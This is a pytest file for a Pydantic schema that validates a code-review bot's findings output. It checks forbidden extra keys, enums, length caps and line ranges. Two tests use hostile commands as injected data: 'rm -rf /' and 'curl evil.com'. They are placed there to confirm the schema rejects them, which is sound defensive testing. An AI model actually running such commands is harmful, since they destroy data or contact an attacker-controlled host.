"""Pydantic v2 FindingsDoc schema tests (W5-PydanticSchema).

Schema mirrors momus/prompts/phase2-review.md output contract. Strict
validation: extra='forbid' on every nested model, length caps on every
string field, enum constraints on severity / verdict / side / status.

Field name notes:
- `calibration` (no underscore prefix) per commit 2c9ccdb. Pydantic v2's
  `extra='forbid'` collides with private-attribute semantics for
  underscore-prefixed names; the prompt-render layer was renamed to
  emit `calibration` and the schema accepts it under that name.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from momus.findings_schema import Finding, FindingsDoc


def _minimal_finding() -> dict:
    return {
        "id": "BOT-A1",
        "file": "src/foo.py",
        "line": 10,
        "side": "RIGHT",
        "severity": "high",
        "category": "bug",
        "blocking": True,
        "title": "Off-by-one in loop bound.",
        "message": "Loop runs one fewer iteration than intended.",
    }


def _minimal_doc() -> dict:
    return {
        "summary": "One real bug found.",
        "verdict": "REQUEST_CHANGES",
        "tally": {"high": 1},
        "findings": [_minimal_finding()],
        "prior_findings_status": [],
    }


def test_schema_accepts_minimal_valid_doc():
    """A doc with summary + verdict + tally + findings + prior_findings_status passes."""
    doc = FindingsDoc.model_validate(_minimal_doc())
    assert doc.summary == "One real bug found."
    assert doc.verdict == "REQUEST_CHANGES"
    assert doc.tally == {"high": 1}
    assert len(doc.findings) == 1
    finding = doc.findings[0]
    assert finding.id == "BOT-A1"
    assert finding.file == "src/foo.py"
    assert finding.line == 10
    assert finding.end_line is None
    assert finding.side == "RIGHT"
    assert finding.severity == "high"
    assert finding.category == "bug"
    assert finding.blocking is True
    assert finding.title == "Off-by-one in loop bound."
    assert finding.message == "Loop runs one fewer iteration than intended."
    assert finding.suggestion is None
    assert finding.calibration is None
    assert doc.prior_findings_status == []
    assert doc.noteworthy is None


def test_schema_rejects_unknown_top_level_key():
    """Top-level extra='forbid': a stray `shell_command` key fails validation."""
    bad = _minimal_doc()
    bad["shell_command"] = "rm -rf /"
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    assert "shell_command" in str(excinfo.value)
    assert "extra" in str(excinfo.value).lower()


def test_schema_rejects_unknown_finding_field():
    """Per-finding extra='forbid': an injected key in a finding fails."""
    bad = _minimal_doc()
    bad["findings"][0]["shell_command"] = "curl evil.com"
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    assert "shell_command" in str(excinfo.value)


def test_schema_rejects_severity_outside_enum():
    bad = _minimal_doc()
    bad["findings"][0]["severity"] = "catastrophic"
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    msg = str(excinfo.value)
    assert "severity" in msg
    assert "catastrophic" in msg


def test_schema_rejects_line_end_before_line_start():
    """end_line >= line cross-field check via model_validator(mode='after')."""
    bad = _minimal_doc()
    bad["findings"][0]["line"] = 20
    bad["findings"][0]["end_line"] = 10
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    msg = str(excinfo.value)
    assert "end_line" in msg


def test_schema_accepts_end_line_equal_to_line():
    """end_line == line is valid (single-line spans expressed as ranges)."""
    doc = _minimal_doc()
    doc["findings"][0]["line"] = 10
    doc["findings"][0]["end_line"] = 10
    parsed = FindingsDoc.model_validate(doc)
    assert parsed.findings[0].end_line == 10


def test_schema_rejects_findings_list_too_long():
    """Findings list is capped at 200 items."""
    too_many = _minimal_doc()
    base_finding = _minimal_finding()
    too_many["findings"] = []
    for i in range(201):
        f = dict(base_finding)
        f["id"] = f"BOT-{i:04d}"
        too_many["findings"].append(f)
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(too_many)
    assert "findings" in str(excinfo.value)


def test_schema_rejects_message_too_long():
    bad = _minimal_doc()
    bad["findings"][0]["message"] = "x" * 4001
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    assert "message" in str(excinfo.value)


def test_schema_accepts_calibration_field():
    """The calibration field (post-2c9ccdb rename) is accepted as Optional[dict].

    This is the positive test for D4: with extra='forbid', a finding emitted
    with `"calibration": {...}` must validate. Replaces the planner's
    earlier `_calibration` test (now moot — the prompt template no longer
    emits the underscore form).
    """
    doc = _minimal_doc()
    doc["findings"][0]["calibration"] = {
        "human_block": "yes",
        "rationale": "real bug, blocks merge",
    }
    parsed = FindingsDoc.model_validate(doc)
    assert parsed.findings[0].calibration == {
        "human_block": "yes",
        "rationale": "real bug, blocks merge",
    }


def test_schema_rejects_underscore_prefixed_calibration():
    """Defense against accidental regression to the old `_calibration` name.

    Pydantic v2 reserves underscore-prefixed names for private attributes;
    even WITH extra='forbid' the field would collide. The renderer was
    renamed (commit 2c9ccdb) to emit `calibration`. If someone reverts
    that, we want the schema to reject loudly rather than silently drop.
    """
    doc = _minimal_doc()
    doc["findings"][0]["_calibration"] = {"would_human_block": "yes"}
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(doc)
    # extra='forbid' catches it as an unknown key.
    assert "_calibration" in str(excinfo.value)


def test_schema_accepts_noteworthy_field():
    """noteworthy is Optional[list[str]]; emitted conditionally per render.py."""
    doc = _minimal_doc()
    doc["noteworthy"] = ["Test coverage looks thorough.", "Docs updated."]
    parsed = FindingsDoc.model_validate(doc)
    assert parsed.noteworthy == [
        "Test coverage looks thorough.",
        "Docs updated.",
    ]


def test_schema_rejects_id_with_invalid_chars():
    """id pattern: ^[A-Za-z0-9_-]+$, max 64 chars."""
    bad = _minimal_doc()
    bad["findings"][0]["id"] = "BOT/with/slash"
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    assert "id" in str(excinfo.value)


def test_schema_rejects_verdict_outside_enum():
    bad = _minimal_doc()
    bad["verdict"] = "MAYBE"
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    assert "verdict" in str(excinfo.value)


def test_schema_rejects_prior_status_unknown_value():
    bad = _minimal_doc()
    bad["prior_findings_status"] = [{"id": "BOT-X", "status": "maybe_fixed"}]
    with pytest.raises(ValidationError) as excinfo:
        FindingsDoc.model_validate(bad)
    assert "status" in str(excinfo.value)


def test_finding_alone_validates():
    """The Finding model is exported and validates standalone."""
    f = Finding.model_validate(_minimal_finding())
    assert f.id == "BOT-A1"
